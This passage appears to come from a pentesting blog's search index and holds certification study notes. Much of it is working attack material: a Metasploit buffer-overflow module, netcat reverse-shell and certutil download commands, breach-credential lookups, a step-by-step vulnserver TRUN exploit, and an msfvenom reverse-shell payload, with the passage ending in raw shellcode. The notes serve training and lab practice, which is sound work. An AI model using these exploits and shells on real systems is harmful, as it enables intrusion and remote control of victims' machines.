tasks: protocols, sockets, services, encoders, text transformations and so on.   → /usr/share/metasploit-framework/lib/rex/ &gt; ls      moreover, u can see that the API documentation may help u to understand all of the features of Rex: http://rapid7.github.io/metasploit-framework/api/    Core library  It implements the set of classes and utilities that can be used as an interface to the framework modules and plugins   → /usr/share/metasploit-framework/lib/msf/core &gt; ls           can be used with an instance based approach       The instance contains the entire framework state and u can create it using the Msf::Framework.new   the core instance can manage modules, plugins, sessions, jobs and so on        it uses features of the Rex library       u can also use the API documentation (Msf node in this case)   it also contains classes defined in the Base library   Base library     its developed on top of the Core library and it makes easier to interact with the framework structure. its purpose is to provide simplified and more user-friendly APIs to improve and speed up the development   /usr/share/metasploit-framework/lib/msf/base &gt; ls   Modules     the part that users uses to perform exploitations and penetration testing activities   if a new payload module is developed, all of the exploits can automatically use it thanks to the framework structure.   → /usr/share/metasploit-framework/modules   Modules:  - payloads - exploits - encoders - post-modules - auxiliary   exploits  → /usr/share/metasploit-framework/modules/exploits      handlers are exploits modules too.   For example:  use exploit/multi/handler      reverse connections can be used to bypass NAT rules since it is the victim that starts the handshake    auxiliary     are used to perform operations different from exploitation. they are generally used when there is no need of a payload or a target.   like Denial of Services (DOS) attacks while some other are used as scanners, information collections and so on.   payloads     u will always use a payload module when u launch an exploit (remember that u usually do a SET PAYLOAD command)   they encapsulate the real malicious code that is going to be executed if the exploitation succeeds (the raw instructions that make it possible to take control of the target machine exploited)   → /usr/share/metasploit-framework/modules/payloads   Types:   → single  → stagers  → stages      single: (me) has all of the raw code to perform a particular task. example: bind_shell is a single payload because it does not require additional code.   a meterpreter connection requires a stager and a staged payload   stager: is used to setup the connection between the target and the attacker machine   then, a staged payload is sent to the target victim and its the real malicious raw code.   Nops and Encoders     are modules related to the exploitation phase   nops modules are used to generate instructions that have no effect to the target machine. A typical nop instruction is \\x90   some nops are detected by AV, therefore metasploit provides some nops generator modules that u can use to generate more sophisticated ones.   Encoders are another type of module used to improve your payload generation in order to make them undetectable from AVs:  /usr/share/metasploit-framework/modules/encoders /usr/share/metasploit-framework/modules/nops   Post     used to perform post exploitation tasks and theregore they may be require an active meterpreter session to interact with as an option.   We can use with run command:  run post/* - /usr/share/metasploit-framework/modules/post   Plugin     used to extend framework capabilities   often they are developed to provide a bridge between the metasploit framework and other pentesting tools   → /usr/share/metasploit-framework/plugins   Some plugin are related to other pentest tools, such as:  - openvas - nessus - nexpose   Tools     are particular scripts that mainly use the Ruby Extension library (Rex) to perform some tasks that do not require any framework interaction or structure.   if u want to use some Rex classes or features, u r writing what is called a metasploit dependent tool and u have to include it the Rex library.   → /usr/share/metasploit-framework/tools   Example:  pattern_create.rb pattern_offset.rb   Write a Module   Module type and location     first thing &gt; identify the module type   In this case, the module that we are going to develop is an exploitation module (since we want to exploit a buffer overflow vulnerability of the els echo server)      we know that it targets apps running on Windows   these infos are important cause it tells us where the real Ruby file module must be stored in order to make it recognizable by the framework   Usage:  use exploit/windows/els/echoserv   We can put the module in two places:  /usr/share/metasploit-framework/modules/exploits/windows # the framework file system  ~/.msf4/modules/exploits/windows # the dir reserved to the private user modules and plugins      the second is better cause avoids any problems related to the framework updates    Start the postgredb:  systemctl start postgresql.service updatedb msfconsole # only then the msf will recognize ur new module   Module high level structure  High level structure of a generic module:  module type module requirements module information module operations    require 'msf/core'  class Metasploit4 &lt; Msf::Exploit::Remote   include Exploit::Remote::Tcp    def initialize(info = {})     super(       update_info(info,         'Name' =&gt; 'Exploit name',         'Description' =&gt; %q{ This module exploits a .....}, # end of description         'Author' =&gt; 'the author name', #-------       )     )   end    def check     # ----   end    def exploit     # ----   end end        in this case, we are going to do a bof exploitation   msf/core library is almost always required For metasploit module    require 'msf/core'  class Metasploit4 &lt; Msf::Exploit::Remote   # module body end   →  http://www.rubydoc.info/github/rapid7/metasploit-framework/Msf/Exploit/Remote   The remote exploit class is a specialization of the exploit module class that is geared toward exploits are performed against targets other than the local machine. This typically implies exploiting other machines via a network connection, though its not limited to this scope   Since the connection we want to establish with the vuln target is a tcp, we need to set the right methods   → http://www.rubydoc.info/github/rapid7/metasploit-framework/Msf/Exploit/Remote/Tcp    require 'msf/core'  class Metasploit4 &lt; Msf::Exploit::Remote   # we need a tcp connection   include Exploit::Remote::Tcp   # module body end       the reload command in metasploit can be used to reload the changes u have made in the module.    Module information     first thing to do is initialize the module with the information related to the module itself   another way to explore the metasploit documentation is by taking a look at the code shown by the initialiaze API For each class of the class chain.   Example:  Class: Msf::Exploit::Remote Object &lt; Module &lt; Msf::Exploit &lt; Msf::Exploit::Remote   To set module information:  def initialize(info = {})   super(     update_info(info,       'Name' =&gt; 'Els ECHO Server',       'Description' =&gt; %q{         This module exploits a buffer overflow found in the Els ECHO Server.       },       'Author' =&gt; 'eLearnSecurity',       'License' =&gt; MSF_LICENSE,       'DefaultOptions' =&gt;         {           'EXITFUNC' =&gt; 'process',           'RPORT' =&gt; '7707'         },       'Payload' =&gt;         {           'BadChars' =&gt; \"\\x00\",         },       'Platform' =&gt; 'win',       'Targets' =&gt;         [           ['Windows XP SP3', { 'Ret' =&gt; 0x7c868667 }],           ['Windows 7', { 'Ret' =&gt; 0x772A2E2B }]         ],       'DefaultTarget' =&gt; 0     ) # End of update_info   ) # End of super end # End initialize     EXITFUNC =&gt; process means that when u close the connection with the specified payload (meterpreter, shell, etc..) the remote process ends too; its not available For further connections.   Payload is used to specify information about the payload generation (encoding, character to avoid, space and so on). In this case we only need to specify one bad character \\x00   Platform=&gt;win means that the target platform is Windows. When we use show payloads command, only Windows payloads will be displayed.   Targets is used to specify information about the various type of targets      Differents OSs have different return addresses to use in the exploit (the address of a CALL ESP For example). Therefore, using Targets, u can parameterize the script.   DefaultTarget=&gt;0 means that when u load the module (use command) the TARGET value is already set to 0; in our case its Windows XP SP3 (the first value in the Targets array)  show options # when we load the module we have some options set like RPORT and TARGET   The check method  check is used to verify if the target is exploitable and its not a mandatory command (its not used by pentesters)   In msf:  check  # its gonna check the target and default port       it checks the banner with s.gets   if the banner is ELS Echo Server 1.1, we treat the target service as vulnerable    def check   connect   banner = sock.gets()   disconnect \t   if (banner =~/ELS Echo Server 1.1/)     return Exploit::CheckCode::Vulnerable   end    return Exploit::CheckCode::Safe end # other module methods   Connect is used to create a tcp connection to the remote target   The target information will be retrieved from RHOST and RPORT parameters   Its a method provided by Remote::Tcp   The attribute to interact with the TCP connection is sock:  socks.gets()  # to get the banner sent by the server      after getting the banner, we can verify its value and return it    The exploit method     it wraps the real exploitation logic code   → use exploit/windows/els/echoserv   Set options:  def exploit   connect   print_status(\"Connected to #{datastore['RHOST']}:#{datastore['RPORT']}\")    handler    print_status(\"Trying target #{target.name}\")   buff = \"\\x90\"*44 + [target.ret].pack('V') + \"\\x90\"*10 + payload.encoded   sock.put(buff)   disconnect end   Connect is used to establish a TCP connection with the target RHOST and RPORT   Print_status outputs some information while datastore is an array that contains the framework options.   Handler is used to open a listening socket to the LHOST and LPORT   Buff stores our full payload      Target and payload are two attributes provided by the Msf::Exploit::Remote class.   Moreover:   → http://www.rubydoc.info/github/rapid7/metasploit-framework/Msf/Module/Target   → http://www.rubydoc.info/github/rapid7/metasploit-framework/Msf/Payload   The payload first sends 44 nops      target.ret, get the return address specified in the initialize method   pack(‘V’) method is used to convert the return address (target.ret) into binary sequence (32-bit little endian).   after that, we add more nops        payload.encoded stores the encoded payload. it takes into account the parameter set in the module configuration       the sock attribute can be used to interact with the service   with sock.put(buff), we send the entire payload (buff) to the server using the available socket   disconnect, closes the connection   if the exploitation succeeds, we will obtain a meterpreter session. thanks to the handler, the stream is automatically opened.   We are using the \\x90 as Nops, but the metasploit framework allows us to generate sophisticated nops with the make_nops instruction&gt;  buff = make_nops(44) + [target.ret].pack('V') + make_nops(10) + payload.encoded   We can parameterize the buffer generation using some Payload parameters:   'Payload' =&gt; {   'Offset-1' =&gt; 44,   'Offset-2' =&gt; 10,   'BadChars' =: \"\\x00\", }  buff = make_nops(payload_info['Offset-1']) + [target.ret].pack('V') + make_nops(payload_info['Offset-2']) + payload.encoded      we can also parameterize the buffer generation using Target parameters    Its a common situation where different targets requires different offset or payload spaces to perform the exploitation   Targets considerations     we have 2 targets, xp and win7   xp does not implement ASLR (Address space layout randomization) like win7 does   if u want to test in another system, u have to get the return address of that system, its the CALL ESP or similar (JMP ESP For example)   Find the address of a win7 using findjmp.exe tool:  findjmp.exe Kernel32.dll ESP # Output: 0x77252E2B call esp   Now we can insert this address in our module For the correct target:      ‘Windows 7’,{ ‘Ret’=&gt;0x77252E2B}   Meterpreter Scripting     its one of the payloads available in the metasploit framework   it has different types of penetest activities such as data harvesting, pivoting and so on.   Meterpreter Basic API  Explore the code available:  /usr/share/metasploit-framework/lib/rex/post/meterpreter      u can test the APIs using the irb interpreter available in each meterpreter session   Default meterpreter scripts can be found here:  /usr/share/metasploit-framework/scripts/meterpreter      examples: hashdump, killav, migrate, scraper, autoroute and so on   we can use them with the run command   U can execute your own meterpreter scripts by putting them in your local dir:  .msf4/scripts/meterpreter/   video  In meterpreter session:  irb client.session_host # ip of the target machine client.session_port  client.methods # list of methods that we can use client.methods.each{ |m| puts m} client.public_methods.each{ |m| puts m} client.info # show current user client.exploit # info about the payload used client.exploit.datastore['PAYLOAD'] client.print_good \"OK\" client.print_status \"OK\" client.print_warning \"OK\" client.print_error \"OK\"   →  /usr/share/metasploit-framework/lib/rex/post      edit meterpreter.rb   cd meterpreter - edit client.rb:  client.core client.sniffer # error client.use[\"sniffer\"] # error client.core.use[\"sniffer\"] # it works   Now we can use the sniffer extension:  client.sniffer   In meterpreter:  use sniffer sniffer  # it shows the options   In irb:  client.sniffer client.sniffer.interfaces[0]['description']      irb:   Grab the PID that u want to migrate with ps:  client.core.migrate(552) # true getpid // get current PID   fs and file  client.fs.dir.pwd # current path client.fs.dir.entries # list the directory client.fs.dir.chdir(\"../\") # cd to parent folder client.fs.file.search(client.fs.dir.pwd,\"*.exe\") //list all exe files in the dir client.fs.file.stat(\"&lt;file&gt;\") # get info about the file client.fs.file.exists? \"&lt;file&gt;\" # true or false      unlink or delete //to delete a file   upload or download   sys config  client.sys.config.getuid # the same as getuid in meterpreter client.sys.config.sysinfo client.platform client.sys.config.getprivs   sys process  client.sys.process.getpid # current pid client.sys.process.processes[0] client.sys.process['explorer.exe'] # pid of the process client.sys.process.kill(368)   net config  config.net.config.get_interfaces[0] config.net.config.get_interfaces[0].class config.net.config.get_interfaces[0].addrs config.net.config.get_interfaces[0].pretty puts config.net.config.get_interfaces[0].pretty client.net.config.each_interface { |i| puts i.pretty } config.net.config.netstat[0] config.net.config.arp_table[0] config.net.config.arp_table[0].ip_addr config.net.config.arp_table[0].mac_addr   - more options For client.net.config.&lt;option&gt;: get_routes add_route remove_route get_proxy_config resolve # to get dns   sys power  client.sys.power.shutdown  # shutdown the victim machine   scraper  In meterpreter:  run scraper -h  # get system info including network shares, registry hives and password hashes      copy the meterpreter_script_template.rb to .msf4/scripts/meterpreter    ","categories": ["notes","ecppt"],
        "tags": ["begginer","pentest","code","ruby"],
        "url": "/notes/ecppt/ruby/",
        "teaser": "/assets/images/posts/2023-11-19-ecppt/ecppt-teaser8.jpg"
      },{
        "title": "Practical Network Penetration Tester",
        "excerpt":"     My Review                  Difficulty: ★★☆☆☆                         Price: ★★☆☆☆       $400                 Material: ★★★☆☆                         Real-World Scenario: ★★★☆☆                         Worth it?: Yes, great option as a second cert after eJPT                         Official Site: PNPT by TCM Security                      I completed all the courses of TCM in 2021. I suppose they may have updated the content by now, but the explanations were really good and concise       I didn’t take that exam at the time because I had already completed the ECPPT. However, when I have the opportunity, I will take it and share the results here   ","categories": ["review"],
        "tags": ["begginer","pentest","review"],
        "url": "/review/pnpt/",
        "teaser": "/assets/images/posts/pnpt/pnpt-teaser1.jpg"
      },{
        "title": "1 - Practical Ethical Hacker",
        "excerpt":"  Pre-Study Session      network   linux   python   Network   IPv4   32 bits - Decimal IPv6   128 bits - Hexadecimal  MAC (media access control)   Layer 2   Relate to switches communication   Every equipment in the network (or NIC - network interface controller) has one   Has 8 pares    The first 3 pares are identifiers   TCP   SYN &gt; SYN/ACK &gt; ACK  PORTS (Common) TCP   FTP (21)   SSH (22)   Telnet (23)   SMTP (25)   DNS (53)   HTTP (80)   HTTPS (443)   SMB (139 + 445)   IMAP (143  UDP   DNS (53)   DHCP (67,68)   TFTP (69)   SNMP (161)   Subnet:  /24 =&gt; network = 255.255.255.0 Why is /24? because adding the binary check of each octect has the total of 24 bits example: 255.255.255.0 = 11111111.11111111.11111111.00000000 = /24                  1  2  3  4  5  6  7  8       255.0.0.0                 9 10 11 12 13 14 15 16       255.255.0.0                 17 18 19 20 21 22 23 24       255.255.255.0                 25 26 27 28 29 30 31 32       255.255.255.255           Hosts:                  128  64  32  16   8   4   2   1           Subnet:                  128 192 224 240 248 252 254 255           ps:  Hosts double each increment of a CIDR Always subtract 2 from host total: network ID - First address broadcast  - last address   Examples:                  IP       subnet       hosts       network       broadcast                 192.168.1.0/24       255.255.252.0       254       192.168.1.0       192.168.1.255                 192.168.1.0/28       255.255.255.240       14       192.168.1.0       192.168.1.15                 192.168.1.16/28       255.255.255.240       14       192.168.1.16       192.168.1.31                 192.168.0.0/23       255.255.254.0       510       192.168.0.0       192.168.1.255                 192.168.2.0/23       255.255.254.0       510       192.168.2.0       192.168.3.255           Test:                  IP       subnet       hosts       network       broadcast                 192.168.0.0/22       255.255.252.0       1022       192.168.0.0       192.168.3.255                 192.168.1.0/26       255.255.255.192       62       192.168.1.0       192.168.1.63                 192.168.1.0/27       255.255.255.224       30       192.168.1.0       192.168.1.31           Linux   ping &lt;ip&gt; -c 1 &gt; ip.txt  cat ip.txt | grep \"64 bytes\" | cut -d \" \" -f 4 | tr -d \":\" grep  # -v \"something \" = grab everything except what you specified after -v # \"somethin\" grab what you specified cut  # -d = delimiter, in this case its a space # -f = the 4th junk of that data separeted by spaces tr (translate) # -d \":\" = delimiter - to extract that coma from the line     ipsweep.sh:  #!/bin/bash  if [ \"$1\" == \"\" ]   then   echo \"You forgot an IP address!\"   echo \"Syntax: ./ipweep.sh 192.168.0\"  else for ip in `seq 1 254`; do   ping -c 1 $1.$ip | grep \"64 bytes\" | cut -d \" \" -f 4 | tr -d \":\" &amp;   done fi    Python    #!/bin/python3  import sys import socket from datetime import datetime  # Define our Target if len(sys.argv) == 2:   target = socket.gethostbyname(sys.argv[1]) # Translate hostaname to IPv4 else:   print(\"Invalid amount of arguments\")   print(\"Syntax: python3 scanner.py &lt;ip&gt;\")  # Add a pretty banner print (\"-\" * 50) print(\"Scanning target \"+target) print(\"Time started: \"+str(datetime.now())) print (\"-\" * 50)  try:   for port in range(50,85):     s = socket.socket(socket.AF_INET, socker.SOCK_STREAM)     socket.setdefaulttimeout(1)     result = s.connect_ex((target,port)) # returns an error indicator     if result == 0:       print(f\"Port {port} is open\")     s.close() except KeyboardInterrupt:   print(\"\\nExiting program.\")   sys.exit() except socket.gaierror:   print(\"Hostname could not be resolved.\")   sys.exit() except socker.error:   print(\"Could not connect to server.\")   sys.exit()    The Five stages of hacking           Reconnaissance       Active vs Passive            Scanning &amp; Enumeration       nmap, nessus, nikto etc            Gaining Access       exploitation            Maintaining Access            Covering Tracks       Reconnaissance   Physical / Social assessment   Location Information:  Satellite images Drone recon Building layout (badge readers, break areas, security, fencing) Job Information Employees (name, job title, phone number, manager, etc) pictures (badge photos, desk photos, computer photos, etc)   Web / Host  Target Validation:   WHOIS, nslookup, dnsrecon  Finding Subdomains:   Google Fu, dig, nmap, sublist3r, Bluto, crt.sh, etc  Fingerprinting:   nmap, wappalyzer, whatweb, BuiltWIth, netcat  Data Breaches:   HaveIBeenPwned, Breach-Parse, WeLeakInfo   Identifying our targets  bugcrowd.com # find companies that we can scan in scope hunter.io # find email addresses phonebook.cz # list domains, emails voilanorbert.com # find email addresses clearbit connect # using within google account to find emails  tools.verifyemailaddress.io # email verification email-checker.net/validate # email verification   Gather breachead credentials with breach-parse at wmaverickadams github  breach-parse has +40gb of files that were breached with the sh program, we can scan through this files   Gather breached credentials with DeHashed  dehashed.com # search emails, phones, usernames, password, etc hashes.org # search breached hashes   Hunting subdomains  sublist3r -d &lt;domain&gt; crt.sh = %.&lt;domain&gt;  # search certificates that have been registered owasp amass - github  tomnomnom/httprobe # github = to test the list of domains   Identifying Website technologies  builtWith.com = Find out what websites are built with wappalyzer - firefox extension = go to the website and run the extension whatweb burpsuite  social media = look 'for' badges, names, pcs, etc   Google Fu  site: &lt;&gt; filetype:&lt;&gt; -www +something    Scanning &amp; Enumeration   Network discover  arp-scan -l  netdiscover -r   port scan  NMAP -sS = SYN SYN/ACK RST (its not send an ack back, thats the stealth mode)  nmap -T4 -p- -A -sC -sV -oA nmap/initial -vv  -sU = udp we may scan with -p only 1000 ports, cause it takes too long to finish   vulnerability scan  nikto   directory scan  dirb dirbuster gobuster dirsearch   scan SMB  auxiliary/scanner/smb/smb_version smbclient -L \\\\\\\\&lt;ip&gt;\\\\ = list the shares smbclient \\\\\\\\&lt;ip&gt;\\\\&lt;share&gt; = open the share   enumerate ssh  \\ssh &lt;ip&gt;  -oKexAlgorithms=+diffie-hellman-group1-sha1 -c aes128-cbc       just because the kioptrix1 is old, we need to add these informations sometimes we try to login without a login/pwd just to see if there is a banner with information that we can use    Researching potential vulnerablities  Now we search with the applications and versions that we found earlier, and try to find any exploit that we can use:  with google:   exploit-db   rapid7  with searchsploit:   -x = to see the code   -m = to copy the exploit  with msfconsole:    search   Configuring Nessus  download &gt; start service &gt; get key with email &gt; enter localhost port 8834 use schedule option if u wanna *sleep more*  /opt/nessus/sbin/nessuscli lsuser # to list User /opt/nessus/sbin/nessuscli chpasswd &lt;user&gt; # to change the password    Gaining Access   Netcat Reverse Shell  =  the target connect to us - used the majority of the time  Kali: nc -lvnp &lt;port&gt;  Target: nc &lt;kali ip&gt; &lt;port&gt; -e /bin/sh   Netcat Bind Shell  =  we connect to target  Kali: nc &lt;ip&gt; &lt;port&gt;  Target: nc -lvnp &lt;port&gt; -e /bin/sh   Non-staged vs staged payloads   non-staged = send exploit shellcode all at once larger in size and wont always work example:   windows/meterpreter_reverse_tcp   staged = send payloads in stages can be less stable example:   windows/meterpreter/reverse_tcp      Tips - sometimes try to change the type of payload non-staged/staged    Exploits  searchsploit msfconsole   Bruteforce  hydra -l &lt;user&gt; -L &lt;user file&gt; -p &lt;password&gt; -P &lt;password file&gt; &lt;host&gt; &lt;service&gt; &lt;req:user/pwd:msg of failure&gt; -t &lt;threads&gt;  msfconsole &gt; auxiliary/scanner/ssh/ssh_login   Burp tips  We can use sniper type of attack to attack one variable and use pitchfork if we need more than 1 variable in burp. Or cluster bomb if we need to try every login/pass possible. To do password spraying or credential stuffing   Capstone   Blue   With nmap we find that the target is using windows 7. searched exploits for w7 and got eternal blue - MS17-010   in msf:  scanner/smb/smb_ms17_010  exploit/windows/smb/ms17_010_eternalblue &gt; check   To see if the machine is vulnerable to this exploit   We can try manual exploit via github &gt; search for eternal blue, it might blue screen the machine.      Tips: In real environments confirm permission to run the exploit, cause it might broke the machine.    Academy  hash-identifier ffuf -w &lt;wordlist&gt; -u &lt;url&gt;/FUZZ      systemctl list-timers = to see each programs/backups ir running in timers       pspy - github = To see all program that are running in the system       [NOTE] ctrl+K in nano deletes a line    Dev  showmount -e &lt;target ip&gt; = to show file shares / mount drivers mkdir mnt/&lt;name&gt; mount -t nfs &lt;target ip&gt;:&lt;path that show in showmount&gt; /mnt/&lt;name&gt;   # -t = type  # the path of the share &gt; the path that we will send the mounted share   fcrackzip = tool to crack zip files that have passwords: # -v = verbose # -u = unzip # -D = dictionary attack # -p = wordlist file # &lt;the output file&gt;   Butler   Grab files in windows: after open a server   Example:  python3 -m http.server  certutil.exe -urlcache -f http://&lt;kali ip&gt;/&lt;file&gt; &lt;output file&gt;   After winPeas:   Unquoted service path: Means that in file register of windows, it need to have quoted path in executable files, and sometimes that is not set in the machine.   Example:  insecure ImagePath = C:\\Program Files (x86)\\Wise\\Wise Care 365\\BootTime.exe secure ImagePath= \"C:\\Program Files (x86)\\Wise\\Wise Care 365\\BootTime.exe\"      When the service is unquoted, windows check for exe files in every space break!       If we have write permissions,   we can put a malicious file ‘for’ example in ..\\Wise\\Wise’.exe’, that should be executed.   To stop a service in Windows:  sc stop &lt;service&gt; = to stop sc query &lt;service&gt; = to show status sc start &lt;service&gt; = to start   BlackPearl  dnsrecon -r &lt;range 127.0.0.0/24&gt; -n &lt;target ip&gt; -d &lt;anything&gt; ffuf -w &lt;wordlist&gt;:FUZZ -u &lt;url&gt;/FUZZ  find / -type f -perm -4000 2&gt;/dev/null GTFObins = to abuse SUID    Buffer Overflow           Installed w10 enterprise:       https://www.microsoft.com/pt-br/evalcenter/evaluate-windows-10-enterprise            Immunity Debugger 1_85:       https://www.immunityinc.com/products/debugger/            vulnserver_master.zip:       http://www.thegreycorner.com/p/vulnserver.html            Installed W10 in a VM:       NAT network       Dont forget to turnoff windows defender and firewall       Anatomy of Memory                  Kernel       11111                 Stack       &lt;’we are gonna focus in here’&gt;                 Heap                         Data                         Text       00000           Anatomy of Stack                  ESP       (extended stack pointer)                 Buffer Space                         EBP       (extended base pointer)                 EIP       (extended instruction pointer) / return address.              Basically, We are gonna inject code to the top of the stack ESP       Until the code surpass the bottom and reach the EIP       That is where we control the return address, to gain reverse shell or whatever suits us.    Spiking   192.168.0.11 172.16.127.128   After connecting to the vulnserver:  nc -nv &lt;target ip&gt; &lt;port&gt;   we type HELP = to see all possibles valible commands  HELP  Valid Commands: HELP STATS [stat_value] RTIME [rtime_value] LTIME [ltime_value] SRUN [srun_value] TRUN [trun_value] GMON [gmon_value] GDOG [gdog_value] KSTET [kstet_value] GTER [gter_value] HTER [hter_value] LTER [lter_value] KSTAN [lstan_value] EXIT      The spiking process is to test by sending caracteres and recon every command to see which is vulnerable   So we have to test each one of them stats, rtime, ltime etc   For this usage, we know that the vulnerable is the TRUN   generic_send_tcp   trun.spk 0 0   'mkdir stats.spk' s_readline(); s_string(\"STATS \"); s_string_variable(\"0\");   we just change the ‘s_string’ to the process we wanna to test \t‘mkdir trun.spk’ s_readline(); s_string(“TRUN “); s_string_variable(“0”);      When we send the spiking script, the vulnerable application should crash   And in the Registers we should see ESP, EBP and EIP overflowed with AAA or 414141      41 is the hexdecimal of A    Fuzzing    #!/usr/bin/python  import sys, socket from time import sleep  buffer = \"A\" * 100  while True:   try:     s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)     s.connect(('172.16.127.128',9999))      s.send(('TRUN /.:/' + buffer))     s.close()     sleep(1)     buffer = buffer + \"A\" * 100   except:     print \"Fuzzing crashed at %s bytes\" %str(len(buffer))     sys.exit()    After running, it crashed the application and show us where aproximately it crashed:  python fuzz.py ^C Fuzzing crashed at '2400 bytes'      If I remember correctly we need to sum 400 bytes, so in 2800 we could overflow the EIP    Finding the Offset  /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2800 # -l = length that we found fuzzing    #!/usr/bin/python  import sys, socket  offset = \"\"  try:   s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)   s.connect(('172.16.127.128',9999))   s.send(('TRUN /.:/' + offset))   s.close() except:   print \"Error connecting to server\"   sys.exit()       So we will generate the payload length with pattern_create   And copy the result in the offset variable   Its supose to crash the application - great   Now we run:  /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2800 -q 386F4337 # -l = length # -q = the value we found in EIP after the crash      Exact match at offset 2003    Overwriting the EIP      We discover the offset at 2003 that run before the EIP that is 4 bytes     #!/usr/bin/python  import sys, socket offset = 2003 shellcode = \"A\" * offset + \"B\" * 4  try:   s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)   s.connect(('172.16.127.128',9999))   s.send(('TRUN /.:/' + shellcode))   s.close() except:   print \"Error connecting to server\"   sys.exit()       We modified the last script with the found value of offset before the application break   And we will execute B in those 4 bytes reserved for the EIP   So the result should crash the application again      However, the value of EBP is 414141 and the value of EIP should be equal to 42424242 = “B”*4    Finding Bad Characters  → https://github.com/cytopia/badchars      We are gonna add the badchars variable to our script and add in the shellcode variable also    Like this:   #!/usr/bin/python  import sys, socket  badchars = (   \"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\"   \"\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\"   \"\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\"   \"\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\"   \"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\"   \"\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\"   \"\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\"   \"\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\"   \"\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\"   \"\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\"   \"\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\"   \"\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\"   \"\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\"   \"\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\"   \"\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\"   \"\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\" )  offset = 2003 shellcode = \"A\" * offset + \"B\" * 4 + badchars  try:   s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)   s.connect(('172.16.127.128',9999))   s.send(('TRUN /.:/' + shellcode))   s.close() except:   print \"Error connecting to server\"   sys.exit()       This time go to Immunity Debugger &gt; register &gt; ESP &gt; follow in dump   And try to find the badchars in the hexdump   How to find Bad Chars?   Hex example:  01 02 03 'B0 B0' 06 07 08 09 0A 0B 0C 0D 0E 0F 10      Here we can identifie the 04 05 are out of place, in this case the badchar is 04 the 05 value is just corrupted by the 04 char    Finding the right module   Here we are looking for DLL or something similar that has no memory protection   → https://github.com/corelan/mona   Copy mona.py to ‘C:\\Program Files (x86)\\Immunity Inc\\Immunity Debugger\\PyCommands   in Immunity Debugger type:  !mona modules      Here we have to choose a module without protection  that have relation with the program we are attacking    in kali:  /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb  nasm &gt; JMP ESP 00000000  FFE4  jmp esp   Take the value - In this case FFE4  in ImuDeb:  !mona find -s \"\\xff\\xe4\" -m essfunc.dll      The result is gonna be to show us the pointers   We choose a pointer starting from the top   In this case: 0x625011af   We need to reverse this pointer value like this:  '0x625011af' &gt;&gt; '\\xaf\\x11\\x50\\x62'      because x86 architectures read the lower order address first, thats why its in reverse   Python updated:   #!/usr/bin/python   import sys, socket  offset = 2003 # eip = \"B\" * 4 pointer = \"\\xaf\\x11\\x50\\x62\" shellcode = \"A\" * offset + pointer #+ eip  try:   s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)   s.connect(('172.16.127.128',9999))   s.send(('TRUN /.:/' + shellcode))   s.close() except:   print \"Error connecting to server\"   sys.exit()    In Immunity  Go to a blue arrow &gt; 'go to address in disassembler' Type the address &gt; in this case: '625011af' should appear the JMP ESP FFE4 press 'F2' to set a breakpoint in the address we wanna modify and run the script      This should break the application again and the value of EIP should be the same as our address 625011af    Generating Shellcode and Gaining Root   Creating the reverse shell payload  msfvenom -p windows/shell_reverse_tcp LHOST=&lt;our ip&gt; LPORT=&lt;port&gt; EXITFUNC=thread -f c -a x86 -b \"\\x00\"  # -p = payload # EXITFUNC = let our payload more stable # -f = file type # -a = architecture # -b = badchars that we found during the process, in this case none so we add only the default       always note the payload size, could be important   copy the payload (between parenteses) to our last script   moreover, we need to add a padding/NOP (no operational) space before the overflow payload    #!/usr/bin/python import sys, socket  offset = \"A\" * 2003 pointer = \"\\xaf\\x11\\x50\\x62\" overflow = (\"\\xb8\\x1e\\x4c\\x2e\\xcc\\xd9\\xc9\\xd9\\x74\\x24\\xf4\\x5f\\x2b\\xc9\\xb1\" \"\\x52\\x31\\x47\\x12\\x03\\x47\\x12\\x83\\xd9\\x48\\xcc\\x39\\x19\\xb8\\x92\" \"\\xc2\\xe1\\x39\\xf3\\x4b\\x04\\x08\\x33\\x2f\\x4d\\x3b\\x83\\x3b\\x03\\xb0\" \"\\x68\\x69\\xb7\\x43\\x1c\\xa6\\xb8\\xe4\\xab\\x90\\xf7\\xf5\\x80\\xe1\\x96\" 